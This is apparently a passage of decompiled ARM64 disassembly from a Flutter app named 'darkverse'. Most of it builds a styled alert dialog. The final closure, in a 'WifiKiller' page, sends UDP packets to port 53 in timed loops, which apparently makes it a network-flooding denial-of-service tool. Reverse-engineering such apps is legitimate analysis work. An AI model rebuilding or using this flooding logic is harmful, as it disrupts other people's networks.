    // 0x94b5b4: r1 = Function '<anonymous closure>':.
    //     0x94b5b4: add             x1, PP, #0x37, lsl #12  ; [pp+0x37510] AnonymousClosure: (0x94b5f0), in [package:darkverse/wifi_external.dart] _WifiKillerPageState::_showAlert (0x94b554)
    //     0x94b5b8: ldr             x1, [x1, #0x510]
    // 0x94b5bc: r0 = AllocateClosure()
    //     0x94b5bc: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x94b5c0: stp             x0, NULL, [SP, #8]
    // 0x94b5c4: ldur            x16, [fp, #-0x10]
    // 0x94b5c8: str             x16, [SP]
    // 0x94b5cc: r4 = const [0x1, 0x2, 0x2, 0x2, null]
    //     0x94b5cc: ldr             x4, [PP, #0x40]  ; [pp+0x40] List(5) [0x1, 0x2, 0x2, 0x2, Null]
    // 0x94b5d0: r0 = showDialog()
    //     0x94b5d0: bl              #0x6af738  ; [package:flutter/src/material/dialog.dart] ::showDialog
    // 0x94b5d4: r0 = Null
    //     0x94b5d4: mov             x0, NULL
    // 0x94b5d8: LeaveFrame
    //     0x94b5d8: mov             SP, fp
    //     0x94b5dc: ldp             fp, lr, [SP], #0x10
    // 0x94b5e0: ret
    //     0x94b5e0: ret             
    // 0x94b5e4: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x94b5e4: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x94b5e8: b               #0x94b578
    // 0x94b5ec: r0 = NullCastErrorSharedWithoutFPURegs()
    //     0x94b5ec: bl              #0xbf8364  ; NullCastErrorSharedWithoutFPURegsStub
  }
  [closure] AlertDialog <anonymous closure>(dynamic, BuildContext) {
    // ** addr: 0x94b5f0, size: 0x3a8
    // 0x94b5f0: EnterFrame
    //     0x94b5f0: stp             fp, lr, [SP, #-0x10]!
    //     0x94b5f4: mov             fp, SP
    // 0x94b5f8: AllocStack(0x50)
    //     0x94b5f8: sub             SP, SP, #0x50
    // 0x94b5fc: SetupParameters([dynamic _ /* r0 */])
    //     0x94b5fc: ldr             x0, [fp, #0x18]
    //     0x94b600: ldur            w2, [x0, #0x17]
    //     0x94b604: add             x2, x2, HEAP, lsl #32
    //     0x94b608: stur            x2, [fp, #-8]
    // 0x94b60c: CheckStackOverflow
    //     0x94b60c: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x94b610: cmp             SP, x16
    //     0x94b614: b.ls            #0x94b990
    // 0x94b618: r0 = Radius()
    //     0x94b618: bl              #0x58951c  ; AllocateRadiusStub -> Radius (size=0x18)
    // 0x94b61c: d0 = 20.000000
    //     0x94b61c: fmov            d0, #20.00000000
    // 0x94b620: stur            x0, [fp, #-0x10]
    // 0x94b624: StoreField: r0->field_7 = d0
    //     0x94b624: stur            d0, [x0, #7]
    // 0x94b628: StoreField: r0->field_f = d0
    //     0x94b628: stur            d0, [x0, #0xf]
    // 0x94b62c: r0 = BorderRadius()
    //     0x94b62c: bl              #0x58a7d8  ; AllocateBorderRadiusStub -> BorderRadius (size=0x18)
    // 0x94b630: mov             x2, x0
    // 0x94b634: ldur            x0, [fp, #-0x10]
    // 0x94b638: stur            x2, [fp, #-0x18]
    // 0x94b63c: StoreField: r2->field_7 = r0
    //     0x94b63c: stur            w0, [x2, #7]
    // 0x94b640: StoreField: r2->field_b = r0
    //     0x94b640: stur            w0, [x2, #0xb]
    // 0x94b644: StoreField: r2->field_f = r0
    //     0x94b644: stur            w0, [x2, #0xf]
    // 0x94b648: StoreField: r2->field_13 = r0
    //     0x94b648: stur            w0, [x2, #0x13]
    // 0x94b64c: r1 = Instance_Color
    //     0x94b64c: add             x1, PP, #0x13, lsl #12  ; [pp+0x13d28] Obj!Color@a0f031
    //     0x94b650: ldr             x1, [x1, #0xd28]
    // 0x94b654: d0 = 0.300000
    //     0x94b654: add             x17, PP, #0xd, lsl #12  ; [pp+0xd180] IMM: double(0.3) from 0x3fd3333333333333
    //     0x94b658: ldr             d0, [x17, #0x180]
    // 0x94b65c: r0 = withOpacity()
    //     0x94b65c: bl              #0xb159d8  ; [dart:ui] Color::withOpacity
    // 0x94b660: stur            x0, [fp, #-0x10]
    // 0x94b664: r0 = BorderSide()
    //     0x94b664: bl              #0x58d2d4  ; AllocateBorderSideStub -> BorderSide (size=0x20)
    // 0x94b668: mov             x1, x0
    // 0x94b66c: ldur            x0, [fp, #-0x10]
    // 0x94b670: stur            x1, [fp, #-0x20]
    // 0x94b674: StoreField: r1->field_7 = r0
    //     0x94b674: stur            w0, [x1, #7]
    // 0x94b678: d0 = 1.000000
    //     0x94b678: fmov            d0, #1.00000000
    // 0x94b67c: StoreField: r1->field_b = d0
    //     0x94b67c: stur            d0, [x1, #0xb]
    // 0x94b680: r0 = Instance_BorderStyle
    //     0x94b680: add             x0, PP, #0xc, lsl #12  ; [pp+0xce40] Obj!BorderStyle@a406e1
    //     0x94b684: ldr             x0, [x0, #0xe40]
    // 0x94b688: StoreField: r1->field_13 = r0
    //     0x94b688: stur            w0, [x1, #0x13]
    // 0x94b68c: d0 = -1.000000
    //     0x94b68c: fmov            d0, #-1.00000000
    // 0x94b690: ArrayStore: r1[0] = d0  ; List_8
    //     0x94b690: stur            d0, [x1, #0x17]
    // 0x94b694: r0 = RoundedRectangleBorder()
    //     0x94b694: bl              #0x58ce88  ; AllocateRoundedRectangleBorderStub -> RoundedRectangleBorder (size=0x10)
    // 0x94b698: mov             x1, x0
    // 0x94b69c: ldur            x0, [fp, #-0x18]
    // 0x94b6a0: stur            x1, [fp, #-0x28]
    // 0x94b6a4: StoreField: r1->field_b = r0
    //     0x94b6a4: stur            w0, [x1, #0xb]
    // 0x94b6a8: ldur            x0, [fp, #-0x20]
    // 0x94b6ac: StoreField: r1->field_7 = r0
    //     0x94b6ac: stur            w0, [x1, #7]
    // 0x94b6b0: ldur            x2, [fp, #-8]
    // 0x94b6b4: LoadField: r0 = r2->field_13
    //     0x94b6b4: ldur            w0, [x2, #0x13]
    // 0x94b6b8: DecompressPointer r0
    //     0x94b6b8: add             x0, x0, HEAP, lsl #32
    // 0x94b6bc: stur            x0, [fp, #-0x10]
    // 0x94b6c0: r0 = TextStyle()
    //     0x94b6c0: bl              #0x4da23c  ; AllocateTextStyleStub -> TextStyle (size=0x70)
    // 0x94b6c4: mov             x1, x0
    // 0x94b6c8: r0 = true
    //     0x94b6c8: add             x0, NULL, #0x20  ; true
    // 0x94b6cc: stur            x1, [fp, #-0x18]
    // 0x94b6d0: StoreField: r1->field_7 = r0
    //     0x94b6d0: stur            w0, [x1, #7]
    // 0x94b6d4: r2 = Instance_Color
    //     0x94b6d4: add             x2, PP, #0x13, lsl #12  ; [pp+0x13d28] Obj!Color@a0f031
    //     0x94b6d8: ldr             x2, [x2, #0xd28]
    // 0x94b6dc: StoreField: r1->field_b = r2
    //     0x94b6dc: stur            w2, [x1, #0xb]
    // 0x94b6e0: r3 = 18.000000
    //     0x94b6e0: add             x3, PP, #0xd, lsl #12  ; [pp+0xdc60] 18
    //     0x94b6e4: ldr             x3, [x3, #0xc60]
    // 0x94b6e8: StoreField: r1->field_1f = r3
    //     0x94b6e8: stur            w3, [x1, #0x1f]
    // 0x94b6ec: r3 = Instance_FontWeight
    //     0x94b6ec: add             x3, PP, #0xc, lsl #12  ; [pp+0xcf08] Obj!FontWeight@a0c471
    //     0x94b6f0: ldr             x3, [x3, #0xf08]
    // 0x94b6f4: StoreField: r1->field_23 = r3
    //     0x94b6f4: stur            w3, [x1, #0x23]
    // 0x94b6f8: r4 = "Orbitron"
    //     0x94b6f8: add             x4, PP, #0xc, lsl #12  ; [pp+0xcf20] "Orbitron"
    //     0x94b6fc: ldr             x4, [x4, #0xf20]
    // 0x94b700: StoreField: r1->field_13 = r4
    //     0x94b700: stur            w4, [x1, #0x13]
    // 0x94b704: r0 = Text()
    //     0x94b704: bl              #0x641544  ; AllocateTextStub -> Text (size=0x50)
    // 0x94b708: mov             x1, x0
    // 0x94b70c: ldur            x0, [fp, #-0x10]
    // 0x94b710: stur            x1, [fp, #-0x20]
    // 0x94b714: StoreField: r1->field_b = r0
    //     0x94b714: stur            w0, [x1, #0xb]
    // 0x94b718: ldur            x0, [fp, #-0x18]
    // 0x94b71c: StoreField: r1->field_13 = r0
    //     0x94b71c: stur            w0, [x1, #0x13]
    // 0x94b720: ldur            x2, [fp, #-8]
    // 0x94b724: ArrayLoad: r0 = r2[0]  ; List_4
    //     0x94b724: ldur            w0, [x2, #0x17]
    // 0x94b728: DecompressPointer r0
    //     0x94b728: add             x0, x0, HEAP, lsl #32
    // 0x94b72c: stur            x0, [fp, #-0x18]
    // 0x94b730: LoadField: r3 = r2->field_f
    //     0x94b730: ldur            w3, [x2, #0xf]
    // 0x94b734: DecompressPointer r3
    //     0x94b734: add             x3, x3, HEAP, lsl #32
    // 0x94b738: LoadField: r4 = r3->field_37
    //     0x94b738: ldur            w4, [x3, #0x37]
    // 0x94b73c: DecompressPointer r4
    //     0x94b73c: add             x4, x4, HEAP, lsl #32
    // 0x94b740: stur            x4, [fp, #-0x10]
    // 0x94b744: r0 = TextStyle()
    //     0x94b744: bl              #0x4da23c  ; AllocateTextStyleStub -> TextStyle (size=0x70)
    // 0x94b748: mov             x1, x0
    // 0x94b74c: r0 = true
    //     0x94b74c: add             x0, NULL, #0x20  ; true
    // 0x94b750: stur            x1, [fp, #-0x30]
    // 0x94b754: StoreField: r1->field_7 = r0
    //     0x94b754: stur            w0, [x1, #7]
    // 0x94b758: ldur            x2, [fp, #-0x10]
    // 0x94b75c: StoreField: r1->field_b = r2
    //     0x94b75c: stur            w2, [x1, #0xb]
    // 0x94b760: r2 = 16.000000
    //     0x94b760: add             x2, PP, #0x12, lsl #12  ; [pp+0x12008] 16
    //     0x94b764: ldr             x2, [x2, #8]
    // 0x94b768: StoreField: r1->field_1f = r2
    //     0x94b768: stur            w2, [x1, #0x1f]
    // 0x94b76c: r2 = "ShareTechMono"
    //     0x94b76c: add             x2, PP, #0x18, lsl #12  ; [pp+0x187c8] "ShareTechMono"
    //     0x94b770: ldr             x2, [x2, #0x7c8]
    // 0x94b774: StoreField: r1->field_13 = r2
    //     0x94b774: stur            w2, [x1, #0x13]
    // 0x94b778: r0 = Text()
    //     0x94b778: bl              #0x641544  ; AllocateTextStub -> Text (size=0x50)
    // 0x94b77c: mov             x2, x0
    // 0x94b780: ldur            x0, [fp, #-0x18]
    // 0x94b784: stur            x2, [fp, #-0x10]
    // 0x94b788: StoreField: r2->field_b = r0
    //     0x94b788: stur            w0, [x2, #0xb]
    // 0x94b78c: ldur            x0, [fp, #-0x30]
    // 0x94b790: StoreField: r2->field_13 = r0
    //     0x94b790: stur            w0, [x2, #0x13]
    // 0x94b794: r1 = Instance_Color
    //     0x94b794: add             x1, PP, #0x13, lsl #12  ; [pp+0x13d28] Obj!Color@a0f031
    //     0x94b798: ldr             x1, [x1, #0xd28]
    // 0x94b79c: d0 = 0.200000
    //     0x94b79c: add             x17, PP, #0xc, lsl #12  ; [pp+0xc150] IMM: double(0.2) from 0x3fc999999999999a
    //     0x94b7a0: ldr             d0, [x17, #0x150]
    // 0x94b7a4: r0 = withOpacity()
    //     0x94b7a4: bl              #0xb159d8  ; [dart:ui] Color::withOpacity
    // 0x94b7a8: stur            x0, [fp, #-0x18]
    // 0x94b7ac: r0 = Radius()
    //     0x94b7ac: bl              #0x58951c  ; AllocateRadiusStub -> Radius (size=0x18)
    // 0x94b7b0: d0 = 12.000000
    //     0x94b7b0: fmov            d0, #12.00000000
    // 0x94b7b4: stur            x0, [fp, #-0x30]
    // 0x94b7b8: StoreField: r0->field_7 = d0
    //     0x94b7b8: stur            d0, [x0, #7]
    // 0x94b7bc: StoreField: r0->field_f = d0
    //     0x94b7bc: stur            d0, [x0, #0xf]
    // 0x94b7c0: r0 = BorderRadius()
    //     0x94b7c0: bl              #0x58a7d8  ; AllocateBorderRadiusStub -> BorderRadius (size=0x18)
    // 0x94b7c4: mov             x2, x0
    // 0x94b7c8: ldur            x0, [fp, #-0x30]
    // 0x94b7cc: stur            x2, [fp, #-0x38]
    // 0x94b7d0: StoreField: r2->field_7 = r0
    //     0x94b7d0: stur            w0, [x2, #7]
    // 0x94b7d4: StoreField: r2->field_b = r0
    //     0x94b7d4: stur            w0, [x2, #0xb]
    // 0x94b7d8: StoreField: r2->field_f = r0
    //     0x94b7d8: stur            w0, [x2, #0xf]
    // 0x94b7dc: StoreField: r2->field_13 = r0
    //     0x94b7dc: stur            w0, [x2, #0x13]
    // 0x94b7e0: r1 = Instance_Color
    //     0x94b7e0: add             x1, PP, #0x13, lsl #12  ; [pp+0x13d28] Obj!Color@a0f031
    //     0x94b7e4: ldr             x1, [x1, #0xd28]
    // 0x94b7e8: d0 = 0.300000
    //     0x94b7e8: add             x17, PP, #0xd, lsl #12  ; [pp+0xd180] IMM: double(0.3) from 0x3fd3333333333333
    //     0x94b7ec: ldr             d0, [x17, #0x180]
    // 0x94b7f0: r0 = withOpacity()
    //     0x94b7f0: bl              #0xb159d8  ; [dart:ui] Color::withOpacity
    // 0x94b7f4: str             x0, [SP]
    // 0x94b7f8: r1 = Null
    //     0x94b7f8: mov             x1, NULL
    // 0x94b7fc: r4 = const [0, 0x2, 0x1, 0x1, color, 0x1, null]
    //     0x94b7fc: add             x4, PP, #0xb, lsl #12  ; [pp+0xbc68] List(7) [0, 0x2, 0x1, 0x1, "color", 0x1, Null]
    //     0x94b800: ldr             x4, [x4, #0xc68]
    // 0x94b804: r0 = Border.all()
    //     0x94b804: bl              #0x6b0744  ; [package:flutter/src/painting/box_border.dart] Border::Border.all
    // 0x94b808: stur            x0, [fp, #-0x30]
    // 0x94b80c: r0 = BoxDecoration()
    //     0x94b80c: bl              #0x63648c  ; AllocateBoxDecorationStub -> BoxDecoration (size=0x28)
    // 0x94b810: mov             x1, x0
    // 0x94b814: ldur            x0, [fp, #-0x18]
    // 0x94b818: stur            x1, [fp, #-0x40]
    // 0x94b81c: StoreField: r1->field_7 = r0
    //     0x94b81c: stur            w0, [x1, #7]
    // 0x94b820: ldur            x0, [fp, #-0x30]
    // 0x94b824: StoreField: r1->field_f = r0
    //     0x94b824: stur            w0, [x1, #0xf]
    // 0x94b828: ldur            x0, [fp, #-0x38]
    // 0x94b82c: StoreField: r1->field_13 = r0
    //     0x94b82c: stur            w0, [x1, #0x13]
    // 0x94b830: r0 = Instance_BoxShape
    //     0x94b830: add             x0, PP, #0xb, lsl #12  ; [pp+0xbd78] Obj!BoxShape@a406a1
    //     0x94b834: ldr             x0, [x0, #0xd78]
    // 0x94b838: StoreField: r1->field_23 = r0
    //     0x94b838: stur            w0, [x1, #0x23]
    // 0x94b83c: r0 = TextStyle()
    //     0x94b83c: bl              #0x4da23c  ; AllocateTextStyleStub -> TextStyle (size=0x70)
    // 0x94b840: mov             x1, x0
    // 0x94b844: r0 = true
    //     0x94b844: add             x0, NULL, #0x20  ; true
    // 0x94b848: stur            x1, [fp, #-0x18]
    // 0x94b84c: StoreField: r1->field_7 = r0
    //     0x94b84c: stur            w0, [x1, #7]
    // 0x94b850: r2 = Instance_Color
    //     0x94b850: add             x2, PP, #0x13, lsl #12  ; [pp+0x13d28] Obj!Color@a0f031
    //     0x94b854: ldr             x2, [x2, #0xd28]
    // 0x94b858: StoreField: r1->field_b = r2
    //     0x94b858: stur            w2, [x1, #0xb]
    // 0x94b85c: r2 = Instance_FontWeight
    //     0x94b85c: add             x2, PP, #0xc, lsl #12  ; [pp+0xcf08] Obj!FontWeight@a0c471
    //     0x94b860: ldr             x2, [x2, #0xf08]
    // 0x94b864: StoreField: r1->field_23 = r2
    //     0x94b864: stur            w2, [x1, #0x23]
    // 0x94b868: r0 = Text()
    //     0x94b868: bl              #0x641544  ; AllocateTextStub -> Text (size=0x50)
    // 0x94b86c: mov             x1, x0
    // 0x94b870: r0 = "OK"
    //     0x94b870: add             x0, PP, #0x16, lsl #12  ; [pp+0x16d90] "OK"
    //     0x94b874: ldr             x0, [x0, #0xd90]
    // 0x94b878: stur            x1, [fp, #-0x30]
    // 0x94b87c: StoreField: r1->field_b = r0
    //     0x94b87c: stur            w0, [x1, #0xb]
    // 0x94b880: ldur            x0, [fp, #-0x18]
    // 0x94b884: StoreField: r1->field_13 = r0
    //     0x94b884: stur            w0, [x1, #0x13]
    // 0x94b888: r0 = TextButton()
    //     0x94b888: bl              #0x6ce7d0  ; AllocateTextButtonStub -> TextButton (size=0x40)
    // 0x94b88c: mov             x3, x0
    // 0x94b890: r0 = false
    //     0x94b890: add             x0, NULL, #0x30  ; false
    // 0x94b894: stur            x3, [fp, #-0x18]
    // 0x94b898: StoreField: r3->field_3b = r0
    //     0x94b898: stur            w0, [x3, #0x3b]
    // 0x94b89c: ldur            x2, [fp, #-8]
    // 0x94b8a0: r1 = Function '<anonymous closure>':.
    //     0x94b8a0: add             x1, PP, #0x37, lsl #12  ; [pp+0x37518] AnonymousClosure: (0x73d18c), in [package:darkverse/install_panel_page.dart] _InstallPanelPageState::_actionButton (0x73d1f4)
    //     0x94b8a4: ldr             x1, [x1, #0x518]
    // 0x94b8a8: r0 = AllocateClosure()
    //     0x94b8a8: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x94b8ac: mov             x1, x0
    // 0x94b8b0: ldur            x0, [fp, #-0x18]
    // 0x94b8b4: StoreField: r0->field_b = r1
    //     0x94b8b4: stur            w1, [x0, #0xb]
    // 0x94b8b8: r1 = false
    //     0x94b8b8: add             x1, NULL, #0x30  ; false
    // 0x94b8bc: StoreField: r0->field_27 = r1
    //     0x94b8bc: stur            w1, [x0, #0x27]
    // 0x94b8c0: r2 = true
    //     0x94b8c0: add             x2, NULL, #0x20  ; true
    // 0x94b8c4: StoreField: r0->field_2f = r2
    //     0x94b8c4: stur            w2, [x0, #0x2f]
    // 0x94b8c8: ldur            x2, [fp, #-0x30]
    // 0x94b8cc: StoreField: r0->field_37 = r2
    //     0x94b8cc: stur            w2, [x0, #0x37]
    // 0x94b8d0: r0 = Container()
    //     0x94b8d0: bl              #0x694b98  ; AllocateContainerStub -> Container (size=0x38)
    // 0x94b8d4: stur            x0, [fp, #-8]
    // 0x94b8d8: ldur            x16, [fp, #-0x40]
    // 0x94b8dc: ldur            lr, [fp, #-0x18]
    // 0x94b8e0: stp             lr, x16, [SP]
    // 0x94b8e4: mov             x1, x0
    // 0x94b8e8: r4 = const [0, 0x3, 0x2, 0x1, child, 0x2, decoration, 0x1, null]
    //     0x94b8e8: add             x4, PP, #0x14, lsl #12  ; [pp+0x148e8] List(9) [0, 0x3, 0x2, 0x1, "child", 0x2, "decoration", 0x1, Null]
    //     0x94b8ec: ldr             x4, [x4, #0x8e8]
    // 0x94b8f0: r0 = Container()
    //     0x94b8f0: bl              #0x6945fc  ; [package:flutter/src/widgets/container.dart] Container::Container
    // 0x94b8f4: r0 = Center()
    //     0x94b8f4: bl              #0x641520  ; AllocateCenterStub -> Center (size=0x1c)
    // 0x94b8f8: mov             x3, x0
    // 0x94b8fc: r0 = Instance_Alignment
    //     0x94b8fc: ldr             x0, [PP, #0x6fa8]  ; [pp+0x6fa8] Obj!Alignment@a09cf1
    // 0x94b900: stur            x3, [fp, #-0x18]
    // 0x94b904: StoreField: r3->field_f = r0
    //     0x94b904: stur            w0, [x3, #0xf]
    // 0x94b908: ldur            x0, [fp, #-8]
    // 0x94b90c: StoreField: r3->field_b = r0
    //     0x94b90c: stur            w0, [x3, #0xb]
    // 0x94b910: r1 = Null
    //     0x94b910: mov             x1, NULL
    // 0x94b914: r2 = 2
    //     0x94b914: mov             x2, #2
    // 0x94b918: r0 = AllocateArray()
    //     0x94b918: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x94b91c: mov             x2, x0
    // 0x94b920: ldur            x0, [fp, #-0x18]
    // 0x94b924: stur            x2, [fp, #-8]
    // 0x94b928: StoreField: r2->field_f = r0
    //     0x94b928: stur            w0, [x2, #0xf]
    // 0x94b92c: r1 = <Widget>
    //     0x94b92c: ldr             x1, [PP, #0x5168]  ; [pp+0x5168] TypeArguments: <Widget>
    // 0x94b930: r0 = AllocateGrowableArray()
    //     0x94b930: bl              #0xbf6a98  ; AllocateGrowableArrayStub
    // 0x94b934: mov             x1, x0
    // 0x94b938: ldur            x0, [fp, #-8]
    // 0x94b93c: stur            x1, [fp, #-0x18]
    // 0x94b940: StoreField: r1->field_f = r0
    //     0x94b940: stur            w0, [x1, #0xf]
    // 0x94b944: r0 = 2
    //     0x94b944: mov             x0, #2
    // 0x94b948: StoreField: r1->field_b = r0
    //     0x94b948: stur            w0, [x1, #0xb]
    // 0x94b94c: r0 = AlertDialog()
    //     0x94b94c: bl              #0x7955d8  ; AllocateAlertDialogStub -> AlertDialog (size=0x70)
    // 0x94b950: ldur            x1, [fp, #-0x20]
    // 0x94b954: StoreField: r0->field_f = r1
    //     0x94b954: stur            w1, [x0, #0xf]
    // 0x94b958: ldur            x1, [fp, #-0x10]
    // 0x94b95c: StoreField: r0->field_1b = r1
    //     0x94b95c: stur            w1, [x0, #0x1b]
    // 0x94b960: ldur            x1, [fp, #-0x18]
    // 0x94b964: StoreField: r0->field_27 = r1
    //     0x94b964: stur            w1, [x0, #0x27]
    // 0x94b968: r1 = Instance_Color
    //     0x94b968: add             x1, PP, #0x32, lsl #12  ; [pp+0x32708] Obj!Color@a11581
    //     0x94b96c: ldr             x1, [x1, #0x708]
    // 0x94b970: StoreField: r0->field_43 = r1
    //     0x94b970: stur            w1, [x0, #0x43]
    // 0x94b974: ldur            x1, [fp, #-0x28]
    // 0x94b978: StoreField: r0->field_5f = r1
    //     0x94b978: stur            w1, [x0, #0x5f]
    // 0x94b97c: r1 = false
    //     0x94b97c: add             x1, NULL, #0x30  ; false
    // 0x94b980: StoreField: r0->field_6b = r1
    //     0x94b980: stur            w1, [x0, #0x6b]
    // 0x94b984: LeaveFrame
    //     0x94b984: mov             SP, fp
    //     0x94b988: ldp             fp, lr, [SP], #0x10
    // 0x94b98c: ret
    //     0x94b98c: ret             
    // 0x94b990: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x94b990: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x94b994: b               #0x94b618
  }
  [closure] Future<void> <anonymous closure>(dynamic, Timer) async {
    // ** addr: 0x94b998, size: 0x1f0
    // 0x94b998: EnterFrame
    //     0x94b998: stp             fp, lr, [SP, #-0x10]!
    //     0x94b99c: mov             fp, SP
    // 0x94b9a0: AllocStack(0xc0)
    //     0x94b9a0: sub             SP, SP, #0xc0
    // 0x94b9a4: SetupParameters(_WifiKillerPageState this /* r1 */)
    //     0x94b9a4: stur            NULL, [fp, #-8]
    //     0x94b9a8: mov             x0, #0
    //     0x94b9ac: add             x1, fp, w0, sxtw #2
    //     0x94b9b0: ldr             x1, [x1, #0x18]
    //     0x94b9b4: ldur            w2, [x1, #0x17]
    //     0x94b9b8: add             x2, x2, HEAP, lsl #32
    //     0x94b9bc: stur            x2, [fp, #-0x70]
    // 0x94b9c0: CheckStackOverflow
    //     0x94b9c0: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x94b9c4: cmp             SP, x16
    //     0x94b9c8: b.ls            #0x94bb70
    // 0x94b9cc: InitAsync() -> Future<void?>
    //     0x94b9cc: ldr             x0, [PP, #0x360]  ; [pp+0x360] TypeArguments: <void?>
    //     0x94b9d0: bl              #0x4a3fd4  ; InitAsyncStub
    // 0x94b9d4: ldur            x0, [fp, #-0x70]
    // 0x94b9d8: LoadField: r2 = r0->field_13
    //     0x94b9d8: ldur            w2, [x0, #0x13]
    // 0x94b9dc: DecompressPointer r2
    //     0x94b9dc: add             x2, x2, HEAP, lsl #32
    // 0x94b9e0: stur            x2, [fp, #-0x80]
    // 0x94b9e4: r1 = 0
    //     0x94b9e4: mov             x1, #0
    // 0x94b9e8: stur            x1, [fp, #-0x78]
    // 0x94b9ec: CheckStackOverflow
    //     0x94b9ec: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x94b9f0: cmp             SP, x16
    //     0x94b9f4: b.ls            #0x94bb78
    // 0x94b9f8: cmp             x1, #2
    // 0x94b9fc: b.ge            #0x94bb54
    // 0x94ba00: r0 = LoadStaticField(0x410)
    //     0x94ba00: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x94ba04: ldr             x0, [x0, #0x820]
    // 0x94ba08: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x94ba0c: cmp             w0, w16
    // 0x94ba10: b.ne            #0x94ba20
    // 0x94ba14: r2 = anyIPv4
    //     0x94ba14: add             x2, PP, #0x37, lsl #12  ; [pp+0x37438] Field <_InternetAddress@16069316.anyIPv4>: static late (offset: 0x410)
    //     0x94ba18: ldr             x2, [x2, #0x438]
    // 0x94ba1c: r0 = InitLateStaticField()
    //     0x94ba1c: bl              #0xbf5cf4  ; InitLateStaticFieldStub
    // 0x94ba20: mov             x1, x0
    // 0x94ba24: r0 = bind()
    //     0x94ba24: bl              #0x87b0b4  ; [dart:io] _RawDatagramSocket::bind
    // 0x94ba28: mov             x1, x0
    // 0x94ba2c: stur            x1, [fp, #-0x88]
    // 0x94ba30: r0 = Await()
    //     0x94ba30: bl              #0x4a3d90  ; AwaitStub
    // 0x94ba34: stur            x0, [fp, #-0x88]
    // 0x94ba38: r4 = 0
    //     0x94ba38: mov             x4, #0
    // 0x94ba3c: ldur            x2, [fp, #-0x70]
    // 0x94ba40: ldur            x3, [fp, #-0x80]
    // 0x94ba44: stur            x4, [fp, #-0x90]
    // 0x94ba48: CheckStackOverflow
    //     0x94ba48: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x94ba4c: cmp             SP, x16
    //     0x94ba50: b.ls            #0x94bb80
    // 0x94ba54: cmp             x4, #9
    // 0x94ba58: b.ge            #0x94bae4
    // 0x94ba5c: LoadField: r1 = r2->field_f
    //     0x94ba5c: ldur            w1, [x2, #0xf]
    // 0x94ba60: DecompressPointer r1
    //     0x94ba60: add             x1, x1, HEAP, lsl #32
    // 0x94ba64: LoadField: r5 = r1->field_1f
    //     0x94ba64: ldur            w5, [x1, #0x1f]
    // 0x94ba68: DecompressPointer r5
    //     0x94ba68: add             x5, x5, HEAP, lsl #32
    // 0x94ba6c: str             NULL, [SP]
    // 0x94ba70: mov             x1, x5
    // 0x94ba74: r4 = const [0, 0x2, 0x1, 0x1, type, 0x1, null]
    //     0x94ba74: ldr             x4, [PP, #0x5f68]  ; [pp+0x5f68] List(7) [0, 0x2, 0x1, 0x1, "type", 0x1, Null]
    // 0x94ba78: r0 = _parseAddressString()
    //     0x94ba78: bl              #0x489590  ; [dart:io] _InternetAddress::_parseAddressString
    // 0x94ba7c: mov             x1, x0
    // 0x94ba80: stur            x1, [fp, #-0xa8]
    // 0x94ba84: r0 = 60
    //     0x94ba84: mov             x0, #0x3c
    // 0x94ba88: branchIfSmi(r1, 0x94ba94)
    //     0x94ba88: tbz             w1, #0, #0x94ba94
    // 0x94ba8c: r0 = LoadClassIdInstr(r1)
    //     0x94ba8c: ldur            x0, [x1, #-1]
    //     0x94ba90: ubfx            x0, x0, #0xc, #0x14
    // 0x94ba94: r17 = 4362
    //     0x94ba94: mov             x17, #0x110a
    // 0x94ba98: cmp             x0, x17
    // 0x94ba9c: b.ne            #0x94bb5c
    // 0x94baa0: ldur            x0, [fp, #-0x88]
    // 0x94baa4: ldur            x7, [fp, #-0x90]
    // 0x94baa8: ldur            x4, [fp, #-0x80]
    // 0x94baac: LoadField: r2 = r0->field_b
    //     0x94baac: ldur            w2, [x0, #0xb]
    // 0x94bab0: DecompressPointer r2
    //     0x94bab0: add             x2, x2, HEAP, lsl #32
    // 0x94bab4: LoadField: r3 = r4->field_b
    //     0x94bab4: ldur            w3, [x4, #0xb]
    // 0x94bab8: r5 = LoadInt32Instr(r3)
    //     0x94bab8: sbfx            x5, x3, #1, #0x1f
    // 0x94babc: mov             x3, x5
    // 0x94bac0: mov             x5, x1
    // 0x94bac4: mov             x1, x2
    // 0x94bac8: mov             x2, x4
    // 0x94bacc: r6 = 53
    //     0x94bacc: mov             x6, #0x35
    // 0x94bad0: r0 = send()
    //     0x94bad0: bl              #0x87dc24  ; [dart:io] _NativeSocket::send
    // 0x94bad4: ldur            x2, [fp, #-0x90]
    // 0x94bad8: add             x4, x2, #1
    // 0x94badc: ldur            x0, [fp, #-0x88]
    // 0x94bae0: b               #0x94ba3c
    // 0x94bae4: ldur            x1, [fp, #-0x78]
    // 0x94bae8: r1 = 1
    //     0x94bae8: mov             x1, #1
    // 0x94baec: r0 = AllocateContext()
    //     0x94baec: bl              #0xbf6ad8  ; AllocateContextStub
    // 0x94baf0: mov             x2, x0
    // 0x94baf4: ldur            x0, [fp, #-0x88]
    // 0x94baf8: stur            x2, [fp, #-0x98]
    // 0x94bafc: StoreField: r2->field_f = r0
    //     0x94bafc: stur            w0, [x2, #0xf]
    // 0x94bb00: LoadField: r1 = r0->field_b
    //     0x94bb00: ldur            w1, [x0, #0xb]
    // 0x94bb04: DecompressPointer r1
    //     0x94bb04: add             x1, x1, HEAP, lsl #32
    // 0x94bb08: r0 = close()
    //     0x94bb08: bl              #0x486044  ; [dart:io] _NativeSocket::close
    // 0x94bb0c: ldur            x2, [fp, #-0x98]
    // 0x94bb10: r1 = Function '<anonymous closure>':.
    //     0x94bb10: add             x1, PP, #0x37, lsl #12  ; [pp+0x37440] AnonymousClosure: (0x57bb9c), in [package:flutter/src/widgets/text_selection.dart] SelectionOverlay::showMagnifier (0x57b8bc)
    //     0x94bb14: ldr             x1, [x1, #0x440]
    // 0x94bb18: stur            x0, [fp, #-0xa0]
    // 0x94bb1c: r0 = AllocateClosure()
    //     0x94bb1c: bl              #0xbf6eac  ; AllocateClosureStub
